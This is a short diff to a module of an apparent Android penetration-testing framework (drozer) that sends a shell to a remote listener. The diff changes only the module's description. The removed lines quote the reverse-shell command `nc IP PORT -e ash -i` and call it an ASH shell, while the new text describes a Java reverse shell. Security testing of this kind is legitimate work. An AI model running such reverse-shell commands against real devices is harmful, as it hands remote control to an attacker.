@@ -3,9 +3,9 @@ from drozer.modules import common, Module
 class Send(Module, common.Shell, common.SuperUser):
 
     name = "Send an ASH shell to a remote listener."
-    description = """Send an ASH Shell to a remote listener.
+    description = """Sends an Java Reverse Shell to the Agent.
 
-This module executes `nc IP PORT -e ash -i`, using BusyBox. This will send an ASH shell to a netcat listener."""
+This module sends a Java reverse shell to the Agent."""
     examples = ""
     author = "Tyrone (@mwrlabs)"
     date = "2013-07-25"
